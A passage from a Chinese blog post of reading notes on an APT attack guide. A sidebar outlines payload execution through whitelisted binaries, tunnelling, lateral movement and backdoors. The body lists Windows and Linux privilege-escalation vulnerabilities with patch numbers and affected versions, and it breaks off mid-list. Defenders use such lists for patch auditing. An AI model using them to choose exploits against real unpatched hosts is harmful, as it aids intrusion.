class="nav-link" href="#87-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Cmstp-exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AD%E5%AD%A3"><span class="nav-number">8.22.</span> <span class="nav-text">87. 基于白名单Cmstp.exe执行payload第十六季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#88-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Ftp-exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%AD%A3"><span class="nav-number">8.23.</span> <span class="nav-text">88. 基于白名单Ftp.exe执行payload第十九季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#89-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Url-dll%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%83%E5%AD%A3"><span class="nav-number">8.24.</span> <span class="nav-text">89. 基于白名单Url.dll执行payload第十七季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#90-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95zipfldr-dll%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%85%AB%E5%AD%A3"><span class="nav-number">8.25.</span> <span class="nav-text">90. 基于白名单zipfldr.dll执行payload第十八季</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E4%BB%A3%E7%90%86"><span class="nav-number">9.</span> <span class="nav-text">七、代理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#54-%E5%9F%BA%E4%BA%8EPowershell%E5%81%9ASocks-4-5%E4%BB%A3%E7%90%86"><span class="nav-number">9.1.</span> <span class="nav-text">54. 基于Powershell做Socks 4-5代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#95-%E5%9F%BA%E4%BA%8EPortfwd%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-number">9.2.</span> <span class="nav-text">95. 基于Portfwd端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#96-HTTP%E9%9A%A7%E9%81%93ABPTTS%E7%AC%AC%E4%B8%80%E5%AD%A3"><span class="nav-number">9.3.</span> <span class="nav-text">96. HTTP隧道ABPTTS第一季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#98-HTTP%E9%9A%A7%E9%81%93reGeorg%E7%AC%AC%E4%BA%8C%E5%AD%A3"><span class="nav-number">9.4.</span> <span class="nav-text">98. HTTP隧道reGeorg第二季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#99-HTTP%E9%9A%A7%E9%81%93Tunna%E7%AC%AC%E4%B8%89%E5%AD%A3"><span class="nav-number">9.5.</span> <span class="nav-text">99. HTTP隧道Tunna第三季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#100-HTTP%E9%9A%A7%E9%81%93reDuh%E7%AC%AC%E5%9B%9B%E5%AD%A3"><span class="nav-number">9.6.</span> <span class="nav-text">100. HTTP隧道reDuh第四季</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="nav-number">10.</span> <span class="nav-text">八、横向渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#55-%E4%B8%8ESmbmap%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB"><span class="nav-number">10.1.</span> <span class="nav-text">55. 与Smbmap结合攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#56-%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BAhash"><span class="nav-number">10.2.</span> <span class="nav-text">56. 离线提取目标机hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#57-64-%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E5%90%8E%E9%97%A8"><span class="nav-number">10.3.</span> <span class="nav-text">57-64. 高级持续渗透-后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#65-%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BAhash%E8%A1%A5%E5%85%85"><span class="nav-number">10.4.</span> <span class="nav-text">65. 离线提取目标机hash补充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#91-%E4%BB%8E%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E4%B8%AD%E5%81%9A%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%AC%AC%E4%B8%80%E5%AD%A3"><span class="nav-number">10.5.</span> <span class="nav-text">91. 从目标文件中做信息搜集第一季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#93-%E4%B8%8ECrackMapExec%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB"><span class="nav-number">10.6.</span> <span class="nav-text">93. 与CrackMapExec结合攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B9%9D%E3%80%81-%E5%85%B6%E5%AE%83"><span class="nav-number">11.</span> <span class="nav-text">九、 其它</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#36-%E8%A7%A3%E5%86%B3vps%E4%B8%8Assh%E6%8E%89%E7%BA%BF"><span class="nav-number">11.1.</span> <span class="nav-text">36. 解决vps上ssh掉线</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="nicaishui"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">nicaishui</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="mailto:jiade@gmail.com" title="E-Mail → mailto:jiade@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/jiade" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;jiade" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://plus.google.com/jiade" title="Google → https:&#x2F;&#x2F;plus.google.com&#x2F;jiade" rel="noopener" target="_blank"><i class="fab fa-google fa-fw"></i>Google</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/jiade" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;jiade" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



        </div>
      </div>
        <div class="back-to-top animated" role="button">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/%E4%B8%93%E6%B3%A8%20APT%20%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20-%20Micro8%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nicaishui">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="隐秘行动">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          专注 APT 攻击与防御
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-12 11:56:11" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-01-13 09:01:21" itemprop="dateModified" datetime="2021-01-13T09:01:21+08:00">2021-01-13</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class=""></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>139k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>2:07</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="专注-APT-攻击与防御-Micro8-读书笔记"><a href="#专注-APT-攻击与防御-Micro8-读书笔记" class="headerlink" title="专注 APT 攻击与防御 - Micro8 读书笔记"></a>专注 APT 攻击与防御 - Micro8 读书笔记</h1><h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-Window提权-快速查找EXP"><a href="#1-Window提权-快速查找EXP" class="headerlink" title="1. Window提权 快速查找EXP"></a>1. Window提权 快速查找EXP<a id="more"></a></h2><p>微软官方安全公告：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</a></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<p>常见提权漏洞及补丁编号如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">MS17-017 [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows 7&#x2F;8)</span><br><span class="line">CVE-2017-8464 [LNK Remote Code Execution Vulnerability] (windows 10&#x2F;8.1&#x2F;7&#x2F;2016&#x2F;2010&#x2F;2008）</span><br><span class="line">CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10&#x2F;8.1&#x2F;7&#x2F;2016&#x2F;2010&#x2F;2008)</span><br><span class="line">MS17-010 [KB4013389] [Windows Kernel Mode Drivers](windows 7&#x2F;2008&#x2F;2003&#x2F;XP)</span><br><span class="line">MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016)</span><br><span class="line">MS16-111 [KB3186973] [kernel api] (Windows 10 10586 (32&#x2F;64)&#x2F;8.1)</span><br><span class="line">MS16-098 [KB3178466] [Kernel Driver] (Win 8.1)</span><br><span class="line">MS16-075 [KB3164038] [Hot Potato] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012)</span><br><span class="line">MS16-034 [KB3143145] [Kernel Driver] (2008&#x2F;7&#x2F;8&#x2F;10&#x2F;2012) </span><br><span class="line">MS16-032 [KB3143141] [Secondary Logon Handle] (2008&#x2F;7&#x2F;8&#x2F;10&#x2F;2012) </span><br><span class="line">MS16-016 [KB3136041] [WebDAV] (2008&#x2F;Vista&#x2F;7) </span><br><span class="line">MS15-097 [KB3089656] [remote code execution] (win8.1&#x2F;2012) </span><br><span class="line">MS15-076 [KB3067505] [RPC] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012) </span><br><span class="line">MS15-077 [KB3077657] [ATM] (XP&#x2F;Vista&#x2F;Win7&#x2F;Win8&#x2F;2000&#x2F;2003&#x2F;2008&#x2F;2012) </span><br><span class="line">MS15-061 [KB3057839] [Kernel Driver] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012) </span><br><span class="line">MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003&#x2F;2008&#x2F;7&#x2F;8&#x2F;2012)</span><br><span class="line">MS15-010 [KB3036220] [Kernel Driver] (2003&#x2F;2008&#x2F;7&#x2F;8) </span><br><span class="line">MS15-015 [KB3031432] [Kernel Driver] (Win7&#x2F;8&#x2F;8.1&#x2F;2012&#x2F;RT&#x2F;2012 R2&#x2F;2008 R2) </span><br><span class="line">MS15-001 [KB3023266] [Kernel Driver] (2008&#x2F;2012&#x2F;7&#x2F;8) </span><br><span class="line">MS14-070 [KB2989935] [Kernel Driver] (2003) </span><br><span class="line">MS14-068 [KB3011780] [Domain Privilege Escalation] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8) </span><br><span class="line">MS14-058 [KB3000061] [Win32k.sys] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8) </span><br><span class="line">MS14-040 [KB2975684] [AFD Driver] (2003&#x2F;2008&#x2F;2012&#x2F;7&#x2F;8) </span><br><span class="line">MS14-002 [KB2914368] [NDProxy] (2003&#x2F;XP) </span><br><span class="line">MS13-053 [KB2850851] [win32k.sys] (XP&#x2F;Vista&#x2F;2003&#x2F;2008&#x2F;win 7) </span><br><span class="line">MS13-046 [KB2840221] [dxgkrnl.sys] (Vista&#x2F;2003&#x2F;2008&#x2F;2012&#x2F;7) </span><br><span class="line">MS13-005 [KB2778930] [Kernel Mode Driver] (2003&#x2F;2008&#x2F;2012&#x2F;win7&#x2F;8) </span><br><span class="line">MS12-042 [KB2972621] [Service Bus] (2008&#x2F;2012&#x2F;win7) </span><br><span class="line">MS12-020 [KB2671387] [RDP] (2003&#x2F;2008&#x2F;7&#x2F;XP) </span><br><span class="line">MS11-080 [KB2592799] [AFD.sys] (2003&#x2F;XP) </span><br><span class="line">MS11-062 [KB2566454] [NDISTAPI] (2003&#x2F;XP) </span><br><span class="line">MS11-046 [KB2503665] [AFD.sys] (2003&#x2F;2008&#x2F;7&#x2F;XP) </span><br><span class="line">MS11-011 [KB2393802] [kernel Driver] (2003&#x2F;2008&#x2F;7&#x2F;XP&#x2F;Vista) </span><br><span class="line">MS10-092 [KB2305420] [Task Scheduler] (2008&#x2F;7) </span><br><span class="line">MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5) </span><br><span class="line">MS10-059 [KB982799] [ACL-Churraskito] (2008&#x2F;7&#x2F;Vista) </span><br><span class="line">MS10-048 [KB2160329] [win32k.sys] (XP SP2 &amp; SP3&#x2F;2003 SP2&#x2F;Vista SP1 &amp; SP2&#x2F;2008 Gold &amp; SP2 &amp; R2&#x2F;Win7) </span><br><span class="line">MS10-015 [KB977165] [KiTrap0D] (2003&#x2F;2008&#x2F;7&#x2F;XP) </span><br><span class="line">MS10-012 [KB971468] [SMB Client Trans2 stack overflow] (Windows 7&#x2F;2008R2) </span><br><span class="line">MS09-050 [KB975517][Remote Code Execution] (2008&#x2F;Vista) </span><br><span class="line">MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0) </span><br><span class="line">MS09-012 [KB959454] [Chimichurri] (Vista&#x2F;win7&#x2F;2008&#x2F;Vista) </span><br><span class="line">MS08-068 [KB957097] [Remote Code Execution] (2000&#x2F;XP) </span><br><span class="line">MS08-067 [KB958644] [Remote Code Execution] (Windows 2000&#x2F;XP&#x2F;Server 2003&#x2F;Vista&#x2F;Server 2008) </span><br><span class="line">MS08-066 [] [] (Windows 2000&#x2F;XP&#x2F;Server 2003) </span><br><span class="line">MS08-025 [KB941693] [Win32.sys] (XP&#x2F;2003&#x2F;2008&#x2F;Vista) </span><br><span class="line">MS06-040 [KB921883] [Remote Code Execution] (2003&#x2F;xp&#x2F;2000) </span><br><span class="line">MS05-039 [KB899588] [PnP Service] (Win 9X&#x2F;ME&#x2F;NT&#x2F;2000&#x2F;XP&#x2F;2003) </span><br><span class="line">MS03-026 [KB823980] [Buffer Overrun In RPC Interface] (&#x2F;NT&#x2F;2000&#x2F;XP&#x2F;2003)</span><br></pre></td></tr></table></figure>
<h2 id="2-Linux提权-依赖EXP篇"><a href="#2-Linux提权-依赖EXP篇" class="headerlink" title="2. Linux提权 依赖EXP篇"></a>2. Linux提权 依赖EXP篇</h2><p>参考链接：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
<p>常见提权漏洞编号如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-1000367 [Sudo] (Sudo 1.8.6p7 - 1.8.20)</span><br><span class="line">CVE-2017-1000112 [a memory corruption due to UFO to non-UFO path switch]</span><br><span class="line">CVE-2017-7494 [Samba Remote execution] (Samba 3.5.0-4.6.4&#x2F;4.5.10&#x2F;4.4.14)</span><br><span class="line">CVE-2017-7308 [a signedness issue in AF_PACKET sockets] (Linux kernel through 4.10.6)</span><br><span class="line">CVE-2017-6074 [a double-free in DCCP protocol] (Linux kernel through 4.9.11)</span><br><span class="line">CVE-2017-5123 [&#39;waitid()&#39;] (Kernel 4.14.0-rc4+)</span><br><span class="line">CVE-2016-9793 [a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options] (Linux kernel before 4.8.14)</span><br><span class="line">CVE-2016-5195 [Dirty cow] (Linux kernel&gt;2.6.22 (released in 2007)</span><br><span class="line">CVE-2016-2384 [a double-free in USB MIDI driver] (Linux kernel before 4.5)</span><br><span class="line">CVE-2016-0728 [pp_key] (3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13,3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6,3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)</span><br><span class="line">CVE-2015-7547 [glibc getaddrinfo] (before Glibc 2.9)</span><br><span class="line">CVE-2015-1328 [overlayfs] (3.13, 3.16.0, 3.19.0)</span><br><span class="line">CVE-2014-5284 [OSSEC] (2.8)</span><br><span class="line">CVE-2014-4699 [ptrace] (before 3.15.4)</span><br><span class="line">CVE-2014-4014 [Local Privilege Escalation] (before 3.14.8)</span><br><span class="line">CVE-2014-3153 [futex] (3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1)</span><br><span class="line">CVE-2014-0196 [rawmodePTY] (2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15)</span><br><span class="line">CVE-2014-0038 [timeoutpwn] (3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)</span><br><span class="line">CVE-2013-2094 [perf_swevent] (3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4,3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3,3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9)</span><br><span class="line">CVE-2013-1858 [clown-newuser] (3.3-3.8)</span><br><span class="line">CVE-2013-1763 [__sock_diag_rcv_msg] (before 3.8.3)</span><br><span class="line">CVE-2013-0268 [msr] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.27, 2.6.28,2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33,2.6.34, 2.6.35, 2.6.36, 2.6.37,2.6.38, 2.6.39, 3.0.0,3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.5, 3.6, 3.7.0, 3.7.6)</span><br><span class="line">CVE-2012-3524 [libdbus] (libdbus 1.5.x and earlier)</span><br><span class="line">CVE-2012-0056 [memodipper] (2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0)</span><br><span class="line">CVE-2010-4347 [american-sign-language] ( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.62.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-4258 [full-nelson] (2.6.31, 2.6.32, 2.6.35, 2.6.37)</span><br><span class="line">CVE-2010-4073 [half_nelson] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.62.6.32, 2.6.33,2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3904 [rds] (2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3437 [pktcdvd] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.62.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-3301 [ptrace_kmod2] (2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)</span><br><span class="line">CVE-2010-3081 [video4linux] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.62.6.31, 2.6.32, 2.6.33)</span><br><span class="line">CVE-2010-2959 [can_bcm] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)</span><br><span class="line">CVE-2010-1146 [reiserfs] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)</span><br><span class="line">CVE-2010-0415 [do_pages_move] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31)</span><br><span class="line">CVE-2009-3547 [pipe.c_32bit] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.42.4.35, 2.4.36, 2.4.37,2.6.15, 2.6.16, 2.6.17,2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.28, 2.6.29,2.6.30, 2.6.31)</span><br><span class="line">CVE-2009-2698 [udp_sendmsg_32bit] (2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19)</span><br><span class="line">CVE-2009-2692 [sock_sendpage] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16,2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.42.4.35, 2.4.36, 2.4.37,2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)</span><br><span 